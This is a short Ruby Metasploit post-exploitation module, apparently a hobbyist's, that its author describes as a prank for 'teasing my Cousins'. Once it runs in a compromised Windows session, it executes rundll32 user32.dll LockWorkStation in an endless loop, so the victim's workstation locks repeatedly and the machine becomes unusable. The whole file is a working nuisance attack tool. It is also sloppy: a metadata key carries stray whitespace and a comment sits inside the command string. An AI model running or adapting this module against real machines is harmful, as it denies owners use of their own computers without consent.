##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'rex'
require 'msf/core/post/windows'
class MetasploitModule < Msf::Post
	      include Msf::Post::Windows
	      def initialize
		    super(
			'       Name'  => 'teas',
			        'Description' => 'A Simple Module i Created Just for teasing my Cousins :v ',
		        	'License'     =>  MSF_LICENSE,
			        'Author'      =>  'M.Samaak'			 
			        )
		    end
		    def run
             loop do 
		          cmd_exec("rundll32.exe user32.dll, LockWorkStation (lock windows)")
     end
   end
end
   

